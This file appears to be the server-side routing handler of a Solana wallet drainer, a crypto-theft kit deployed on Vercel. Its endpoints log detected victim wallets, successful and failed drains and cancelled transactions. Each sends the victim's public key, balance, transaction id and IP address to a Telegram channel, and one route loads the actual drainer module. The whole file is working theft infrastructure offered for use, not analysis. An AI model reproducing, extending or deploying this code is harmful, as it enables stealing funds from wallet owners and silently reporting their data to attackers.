export default async function handler(req, res) {
  // Set CORS headers for Vercel deployment
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }
  
  const { pathname } = new URL(req.url, `http://${req.headers.host}`);
  
  // Route based on path
  if (pathname === '/api/drainer/log-wallet') {
    await handleWalletLogging(req, res);
  } else if (pathname === '/api/drainer/log-confirmation') {
    await handleConfirmationLogging(req, res);
  } else if (pathname === '/api/drainer/log-cancellation') {
    await handleCancellationLogging(req, res);
  } else if (pathname === '/api/drainer') {
    // Import and use the real drainer logic
    try {
      const drainerHandler = (await import('./drainer.js')).default;
      return await drainerHandler(req, res);
    } catch (error) {
      console.error('[VERCEL] Failed to import drainer:', error);
      res.status(500).json({ 
        error: 'Server configuration error',
        details: 'Failed to load drainer module'
      });
    }
  } else {
    res.status(404).json({ error: 'Not found' });
  }
}

// Wallet logging handler
async function handleWalletLogging(req, res) {
  try {
    // Silent request logging for production
    
    const { publicKey, walletType, origin, userAgent, lamports } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
    
    // Validate required fields
    if (!publicKey) {
      console.error('[SERVER] Missing publicKey in request');
      return res.status(400).json({ error: 'Missing publicKey' });
    }
    
    // Silent wallet logging for production
    
    // Import and use Telegram logging
    try {
      const telegramLogger = (await import('../src/telegram.js')).default;
      await telegramLogger.logWalletDetected({
        publicKey: publicKey,
        walletType: walletType || 'Unknown',
        lamports: lamports || 0,
        ip: userIp
      });
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log wallet detection:', telegramError);
      // Fallback to console logging
      // Silent fallback logging for production
    }
    
    // Silent success logging for production
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[SERVER] Error logging wallet connection:', error);
    res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
  }
}

// Confirmation logging handler
async function handleConfirmationLogging(req, res) {
  try {
    // Silent confirmation logging for production
    const { publicKey, txid, status, error } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
    
    if (status === 'confirmed' || status === 'finalized' || status === 'processed' || status === 'broadcast_success') {
      // Silent success confirmation logging for production
      try {
        const telegramLogger = (await import('../src/telegram.js')).default;
        await telegramLogger.logDrainSuccess({
          publicKey: publicKey,
          txid: txid,
          status: status,
          ip: userIp,
          lamports: req.body.lamports || 0
        });
      } catch (telegramError) {
        console.error('[TELEGRAM] Failed to log drain success:', telegramError);
        // Silent drain success logging for production
      }
    } else if (error) {
              // Silent failed confirmation logging for production
      try {
        const telegramLogger = (await import('../src/telegram.js')).default;
        await telegramLogger.logDrainFailed({
          publicKey: publicKey,
          txid: txid,
          error: error,
          ip: userIp,
          lamports: req.body.lamports || 0
        });
      } catch (telegramError) {
        console.error('[TELEGRAM] Failed to log drain failed:', telegramError);
        // Silent drain failed logging for production
      }
    } else {
              // Silent unknown status logging for production
    }
    
    // Silent confirmation success logging for production
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[CONFIRMATION] Error logging confirmation:', error);
    res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
  }
}

// Cancellation logging handler
async function handleCancellationLogging(req, res) {
  try {
    // Silent cancellation logging for production
    const { publicKey, walletType, reason } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
    
    try {
      const telegramLogger = (await import('../src/telegram.js')).default;
      await telegramLogger.logTransactionCancelled({
        publicKey: publicKey,
        walletType: walletType || 'Unknown',
        reason: reason || 'User canceled the transaction',
        ip: userIp,
        lamports: req.body.lamports || 0
      });
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log cancellation:', telegramError);
      // Silent cancellation details logging for production
    }
    
    // Silent cancellation success logging for production
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[CANCELLATION] Error logging cancellation:', error);
    res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
  }
} 